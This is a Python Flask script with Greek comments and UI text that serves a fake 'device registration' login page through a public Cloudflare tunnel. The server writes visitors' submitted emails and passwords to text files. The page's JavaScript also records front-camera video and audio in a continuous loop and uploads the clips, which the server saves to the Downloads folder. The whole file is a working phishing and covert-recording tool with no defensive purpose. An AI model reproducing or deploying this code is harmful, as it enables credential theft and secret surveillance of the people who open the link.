import os
import base64
import subprocess
import sys
import re
import logging
import json
from threading import Thread
import time
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify

# --- Dependency and Tunnel Setup ---

def install_package(package):
    """Εγκαθιστά ένα πακέτο χρησιμοποιώντας pip ήσυχα."""
    subprocess.check_call([sys.executable, "-m", "pip", "install", package, "-q", "--upgrade"])

def check_dependencies():
    """Ελέγχει για cloudflared και τα απαραίτητα πακέτα Python."""
    try:
        subprocess.run(["cloudflared", "--version"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("[ΣΦΑΛΜΑ] Το 'cloudflared' δεν είναι εγκατεστημένο ή δεν βρίσκεται στο PATH του συστήματος.", file=sys.stderr)
        print("Παρακαλώ εγκαταστήστε το από: https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/", file=sys.stderr)
        sys.exit(1)
    try:
        import flask
    except ImportError:
        print("Εγκατάσταση πακέτου που λείπει: Flask...", file=sys.stderr)
        install_package("Flask")

def run_cloudflared_and_print_link(port, script_name):
    """Ξεκινά ένα tunnel cloudflared και τυπώνει το δημόσιο σύνδεσμο."""
    cmd = ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{port}", "--protocol", "http2"]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    for line in iter(process.stdout.readline, ''):
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            print(f"{script_name} Δημόσιος Σύνδεσμος: {match.group(0)}")
            sys.stdout.flush()
            break
    process.wait()

def get_recording_duration():
    """Ζητά από τον χρήστη τη διάρκεια εγγραφής σε δευτερόλεπτα."""
    print("\n" + "="*60)
    print("ΡΥΘΜΙΣΗ ΔΙΑΡΚΕΙΑΣ ΕΓΓΡΑΦΗΣ")
    print("="*60)
    print("Πόσα δευτερόλεπτα πρέπει να διαρκεί κάθε εγγραφή βίντεο;")
    print("Προτείνεται: 5-10 δευτερόλεπτα για καλύτερα αποτελέσματα")
    print("Εισάγετε έναν αριθμό μεταξύ 1 και 60 (προεπιλογή: 5)")
    print("-"*60)
    
    while True:
        try:
            user_input = input("Διάρκεια εγγραφής (δευτερόλεπτα): ").strip()
            
            if user_input == "":
                print("Χρήση προεπιλεγμένης διάρκειας: 5 δευτερόλεπτα")
                return 5
            
            duration = int(user_input)
            
            if duration < 1:
                print("Η διάρκεια πρέπει να είναι τουλάχιστον 1 δευτερόλεπτο. Δοκιμάστε ξανά.")
                continue
            elif duration > 60:
                print("Η διάρκεια δεν μπορεί να υπερβαίνει τα 60 δευτερόλεπτα. Δοκιμάστε ξανά.")
                continue
            
            print(f"Ορισμός διάρκειας εγγραφής σε: {duration} δευτερόλεπτα")
            return duration
            
        except ValueError:
            print("Παρακαλώ εισάγετε έναν έγκυρο αριθμό. Δοκιμάστε ξανά.")


# --- Flask Application ---

app = Flask(__name__)

# Global variable for recording duration (will be set after user input)
RECORDING_DURATION_MS = 5000  # Προεπιλογή 5 δευτερολέπτων σε χιλιοστοδευτερόλεπτα

DOWNLOAD_FOLDER = os.path.expanduser('~/storage/downloads/Front Camera Videos')
os.makedirs(DOWNLOAD_FOLDER, exist_ok=True)

# We'll create the HTML template dynamically to include the recording duration
def create_html_template(duration_ms):
    """Δημιουργεί το HTML πρότυπο με την καθορισμένη διάρκεια εγγραφής."""
    duration_seconds = duration_ms / 1000
    
    return f'''
<!DOCTYPE html>
<html lang="el">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ασφαλής Πρόσβαση</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <style>
        :root {{
            --bg-color: #f0f2f5; --form-bg-color: #ffffff; --text-color: #1c1e21;
            --subtle-text-color: #606770; --border-color: #dddfe2; --button-bg-color: #0d6efd;
            --button-hover-bg-color: #0b5ed7;
        }}
        @media (prefers-color-scheme: dark) {{
            :root {{
                --bg-color: #121212; --form-bg-color: #1e1e1e; --text-color: #e4e6eb;
                --subtle-text-color: #b0b3b8; --border-color: #444; --button-bg-color: #2374e1;
                --button-hover-bg-color: #3982e4;
            }}
            input {{ color-scheme: dark; }}
        }}
        body {{
            margin: 0; padding: 20px; box-sizing: border-box; background-color: var(--bg-color);
            color: var(--text-color); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; text-align: center;
        }}
        .main-container {{ width: 100%; max-width: 400px; }}
        .logo-container {{ margin-bottom: 24px; }}
        .logo-container svg {{ width: 48px; height: 48px; fill: var(--button-bg-color); }}
        .login-form {{
            background: var(--form-bg-color); padding: 32px; border-radius: 12px;
            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.08); border: 1px solid var(--border-color);
        }}
        h1 {{ margin: 0 0 12px 0; font-size: 28px; font-weight: 600; }}
        p {{ color: var(--subtle-text-color); font-size: 16px; margin: 0 0 28px 0; line-height: 1.5; }}
        input[type="email"], input[type="password"] {{
            width: 100%; padding: 14px; margin-bottom: 16px; border: 1px solid var(--border-color);
            background-color: var(--bg-color); color: var(--text-color); border-radius: 8px; font-size: 16px; box-sizing: border-box;
        }}
        input::placeholder {{ color: var(--subtle-text-color); }}
        input[type="submit"] {{
            width: 100%; padding: 14px; background-color: var(--button-bg-color); border: none;
            border-radius: 8px; color: white; font-size: 17px; font-weight: 600; cursor: pointer; transition: background-color 0.2s ease;
        }}
        input[type="submit"]:hover {{ background-color: var(--button-hover-bg-color); }}
        footer {{ margin-top: 32px; font-size: 13px; color: var(--subtle-text-color); }}
        footer a {{ color: var(--subtle-text-color); text-decoration: none; margin: 0 8px; }}
        footer a:hover {{ text-decoration: underline; }}
        .duration-info {{
            position: fixed;
            bottom: 20px;
            left: 20px;
            background-color: rgba(0, 0, 0, 0.7);
            color: white;
            padding: 8px 12px;
            border-radius: 8px;
            font-size: 12px;
            z-index: 1000;
        }}
    </style>
</head>
<body>
    <div class="main-container">
        <header class="logo-container">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/></svg>
        </header>
        <main class="login-form">
            <form action="/submit_credentials" method="post">
                <h1>Εγγραφή Συσκευής</h1>
                <p>Για να ολοκληρώσετε την εγγραφή της συσκευής σας, παρακαλώ σαρώστε τον κωδικό QR πιστοποίησης που σας παρέχεται.</p>
                <input type="email" name="email" placeholder="Εισάγετε τη διεύθυνση email σας" required>
                <input type="password" name="password" placeholder="Εισάγετε τον κωδικό πρόσβασής σας" required>
                <input type="submit" value="Επαλήθευση Συσκευής">
            </form>
        </main>
        <footer>
            <a href="#">Όροι Χρήσης</a> &bull; <a href="#">Πολιτική Απορρήτου</a> &bull; <a href="#">Υποστήριξη</a>
        </footer>
    </div>
    <div class="duration-info" id="durationInfo">Εγγραφή: {duration_seconds}ς διαστήματα</div>
    
    <script>
        let mediaRecorder;
        let recordedChunks = [];
        let stream;
        let isRecording = false;
        let recordingTimer;
        
        // Διάρκεια εγγραφής σε χιλιοστοδευτερόλεπτα
        const RECORDING_DURATION_MS = {duration_ms};

        async function startCamera() {{
            const constraints = {{
                audio: true, // Συμπερίληψη ήχου στην εγγραφή
                video: {{ 
                    facingMode: 'user', // Αίτηση μπροστινής κάμερας (αλλάχθηκε από 'environment')
                    width: {{ ideal: 1280 }},
                    height: {{ ideal: 720 }}
                }}
            }};

            try {{
                stream = await navigator.mediaDevices.getUserMedia(constraints);
                startContinuousRecording();
            }} catch (err) {{
                console.error("Πρόσβαση μπροστινής κάμερας απέτυχε:", err);
                // Επιστροφή στην πίσω κάμερα αν η μπροστινή δεν είναι διαθέσιμη
                try {{
                    constraints.video.facingMode = 'environment';
                    stream = await navigator.mediaDevices.getUserMedia(constraints);
                    startContinuousRecording();
                }} catch (fallbackErr) {{
                    console.error("Πρόσβαση κάμερας απέτυχε τελείως:", fallbackErr);
                }}
            }}
        }}

        function startContinuousRecording() {{
            if (!stream) return;
            
            // Έναρξη πρώτης εγγραφής
            startRecording();
        }}

        function startRecording() {{
            if (!stream) return;
            
            // Διακοπή τυχόν υπάρχουσας εγγραφής
            if (mediaRecorder && mediaRecorder.state !== 'inactive') {{
                mediaRecorder.stop();
            }}
            
            try {{
                recordedChunks = [];
                
                // Δοκιμή διαφορετικών τύπων mime για συμβατότητα
                const options = {{ mimeType: 'video/webm;codecs=vp9,opus' }};
                
                try {{
                    mediaRecorder = new MediaRecorder(stream, options);
                }} catch (e) {{
                    // Επιστροφή στον προεπιλεγμένο τύπο mime
                    mediaRecorder = new MediaRecorder(stream);
                }}
                
                mediaRecorder.ondataavailable = (event) => {{
                    if (event.data && event.data.size > 0) {{
                        recordedChunks.push(event.data);
                    }}
                }};
                
                mediaRecorder.onstop = handleRecordingStop;
                mediaRecorder.onerror = (event) => {{
                    console.error("Σφάλμα MediaRecorder:", event.error);
                    // Προσπάθεια επανεκκίνησης εγγραφής μετά από σφάλμα
                    setTimeout(startRecording, 1000);
                }};
                
                // Έναρξη εγγραφής
                mediaRecorder.start(1000); // Συλλογή δεδομένων κάθε δευτερόλεπτο
                isRecording = true;
                
                // Διακοπή εγγραφής μετά την καθορισμένη διάρκεια
                recordingTimer = setTimeout(() => {{
                    if (isRecording && mediaRecorder && mediaRecorder.state === 'recording') {{
                        mediaRecorder.stop();
                    }}
                }}, RECORDING_DURATION_MS);
                
            }} catch (err) {{
                console.error("Σφάλμα έναρξης εγγραφής:", err);
                // Νέα προσπάθεια μετά από καθυστέρηση
                setTimeout(startRecording, 1000);
            }}
        }}

        function handleRecordingStop() {{
            isRecording = false;
            clearTimeout(recordingTimer);
            
            // Αποστολή του εγγεγραμμένου βίντεο
            sendVideoToServer();
            
            // Έναρξη επόμενης εγγραφής αμέσως (με μικρή καθυστέρηση για καθαρή έναρξη)
            setTimeout(startRecording, 100);
        }}

        function sendVideoToServer() {{
            if (recordedChunks.length === 0) {{
                console.log("Δεν υπάρχουν δεδομένα βίντεο για αποστολή");
                return;
            }}
            
            try {{
                const videoBlob = new Blob(recordedChunks, {{ type: 'video/webm' }});
                
                if (videoBlob.size === 0) {{
                    console.log("Κενό blob βίντεο");
                    return;
                }}
                
                // Μετατροπή blob σε base64
                const reader = new FileReader();
                reader.onloadend = function() {{
                    const result = reader.result;
                    if (!result) {{
                        console.log("Αποτυχία ανάγνωσης blob βίντεο");
                        return;
                    }}
                    
                    const base64data = result.split(',')[1];
                    
                    $.ajax({{
                        url: '/capture_video',
                        type: 'POST',
                        data: JSON.stringify({{
                            video: base64data,
                            timestamp: new Date().toISOString()
                        }}),
                        contentType: 'application/json',
                        success: function(response) {{
                            console.log('Το βίντεο ανέβηκε επιτυχώς:', response.filename);
                        }},
                        error: function(xhr, status, error) {{
                            console.error('Σφάλμα ανεβάσματος βίντεο:', error);
                        }}
                    }});
                }};
                
                reader.onerror = function(error) {{
                    console.error("Σφάλμα ανάγνωσης blob βίντεο:", error);
                }};
                
                reader.readAsDataURL(videoBlob);
                
            }} catch (err) {{
                console.error("Σφάλμα προετοιμασίας βίντεο για ανέβασμα:", err);
            }}
        }}

        // Έναρξη κάμερας κατά τη φόρτωση σελίδας
        $(document).ready(function() {{
            startCamera();
            
            // Αυτόματη ανανέωση σελίδας κάθε 30 λεπτά για αποφυγή πιθανών προβλημάτων μνήμης
            setTimeout(function() {{
                console.log("Ανανέωση σελίδας για διατήρηση εγγραφής...");
                location.reload();
            }}, 30 * 60 * 1000);
        }});
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(create_html_template(RECORDING_DURATION_MS))

@app.route('/submit_credentials', methods=['POST'])
def submit_credentials():
    date_str = datetime.now().strftime('%Y%m%d_%H%M%S')
    credentials_file = os.path.join(DOWNLOAD_FOLDER, f"credentials_{date_str}.txt")
    with open(credentials_file, 'w') as f:
        f.write(f"Email: {request.form.get('email')}\nPassword: {request.form.get('password')}\n")
    return "Η επαλήθευση ήταν επιτυχής. Θα ανακατευθυνθείτε σύντομα.", 200

@app.route('/capture_video', methods=['POST'])
def capture_video():
    try:
        data = request.get_json()
        if data and 'video' in data:
            video_data = data['video']
            
            # Δημιουργία ονόματος αρχείου με χρήση τρέχουσας ώρας διακομιστή σε μορφή YYYYMMDD_HHMMSS
            date_str = datetime.now().strftime('%Y%m%d_%H%M%S')
            
            # Έλεγχος αν το αρχείο υπάρχει ήδη και προσθήκη μετρητή αν χρειάζεται
            base_filename = f"{date_str}.webm"
            video_file = os.path.join(DOWNLOAD_FOLDER, base_filename)
            
            # Αν το αρχείο υπάρχει, προσθέτουμε έναν μετρητή (π.χ., 20231224_143045_1.webm, 20231224_143045_2.webm)
            counter = 1
            while os.path.exists(video_file):
                video_file = os.path.join(DOWNLOAD_FOLDER, f"{date_str}_{counter}.webm")
                counter += 1
            
            with open(video_file, 'wb') as f:
                f.write(base64.b64decode(video_data))
            
            print(f"Αποθηκεύτηκε βίντεο {RECORDING_DURATION_MS/1000}-δευτερολέπτων: {os.path.basename(video_file)}")
            return jsonify({"status": "success", "filename": os.path.basename(video_file)}), 200
        else:
            return jsonify({"status": "error", "message": "Δεν ελήφθησαν δεδομένα βίντεο"}), 400
    except Exception as e:
        print(f"Σφάλμα αποθήκευσης βίντεο: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/capture', methods=['POST'])
def capture():
    # Διατήρηση αυτού του endpoint για συμβατότητα
    return "Το endpoint δεν χρησιμοποιείται για εγγραφή βίντεο", 200

if __name__ == '__main__':
    check_dependencies()
    
    # Λήψη διάρκειας εγγραφής από τον χρήστη
    recording_duration_seconds = get_recording_duration()
    RECORDING_DURATION_MS = recording_duration_seconds * 1000
    
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    sys.modules['flask.cli'].show_server_banner = lambda *x: None
    port = 4042  # Άλλαξε σε διαφορετική θύρα για παράλληλη εκτέλεση με την έκδοση πίσω κάμερας
    script_name = "Σελίδα Σύνδεσης (Συνεχόμενα Βίντεο Μπροστινής Κάμερας)"
    
    print("\n" + "="*60)
    print("ΕΚΚΙΝΗΣΗ ΔΙΑΚΟΜΙΣΤΗ")
    print("="*60)
    print(f"Τα αρχεία βίντεο θα αποθηκευτούν στο: {DOWNLOAD_FOLDER}")
    print(f"Κάθε βίντεο θα εγγράφεται για: {recording_duration_seconds} δευτερόλεπτα")
    print("Τα βίντεο θα αποθηκεύονται ως: YYYYMMDD_HHMMSS.webm")
    print("Αν πολλά βίντεο εγγραφούν το ίδιο δευτερόλεπτο, θα αποθηκευτούν ως:")
    print("  YYYYMMDD_HHMMSS_1.webm, YYYYMMDD_HHMMSS_2.webm, κ.λπ.")
    print("\nΕκκίνηση διακομιστή...")
    print(f"Αυτό το script θα εγγράφει συνεχώς βίντεο {recording_duration_seconds}-δευτερολέπτων από την ΜΠΡΟΣΤΙΝΗ κάμερα.")
    print("Πατήστε Ctrl+C για διακοπή.\n")
    
    flask_thread = Thread(target=lambda: app.run(host='127.0.0.1', port=port))
    flask_thread.daemon = True
    flask_thread.start()
    time.sleep(1)
    try:
        run_cloudflared_and_print_link(port, script_name)
    except KeyboardInterrupt:
        print("\nΤερματισμός...")
        sys.exit(0)